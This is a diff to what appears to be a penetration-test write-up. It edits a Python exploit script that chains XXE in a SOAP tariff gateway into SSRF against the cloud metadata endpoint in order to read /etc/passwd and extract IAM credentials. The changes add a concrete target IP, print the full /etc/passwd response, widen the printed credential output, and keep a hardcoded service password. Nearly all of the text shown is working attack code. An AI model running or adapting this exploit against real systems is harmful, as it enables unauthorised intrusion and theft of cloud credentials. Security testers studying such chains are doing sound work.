@@ -224,7 +224,7 @@ XXE → SSRF → IMDS Credential Extraction — M3 RPAL Tariff Gateway
 import requests, json, re
 from lxml import etree
 
-TARGET = "http://203.x.x.x:8080/TariffGateway"
+TARGET = "http://203.0.0.236:8080/TariffGateway"
 CREDS  = ("rpal-tariff-svc", "TariffGW@Soap!2024#RPAL")
 
 def soap_xxe(url: str) -> str:
@@ -249,6 +249,7 @@ print("[*] Phase 1: Confirming XXE with /etc/passwd")
 resp = soap_xxe("file:///etc/passwd")
 if "root:x:" in resp:
     print("[+] XXE confirmed — /etc/passwd content in response")
+    print(resp)
 
 print("\n[*] Phase 2: Enumerating IMDS")
 resp = soap_xxe("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
@@ -265,11 +266,11 @@ if m:
     print("\n[+] IAM Credentials extracted:")
     for k, v in creds.items():
         if not k.startswith('_'):
-            print(f"    {k}: {str(v)[:60]}")
+            print(f"    {k}: {str(v)[:128]}")
     print(f"\n[+] Internal endpoint: {creds.get('_rpal_endpoint','N/A')}")
     print("[+] These credentials grant access to M4 admin export API")
 else:
-    print(f"[-] Credential extraction failed. Raw response:\n{resp[:500]}")
+    print(f"[-] Credential extraction failed. Raw response:\n{resp[:500]}") 
 ```
 
 ---
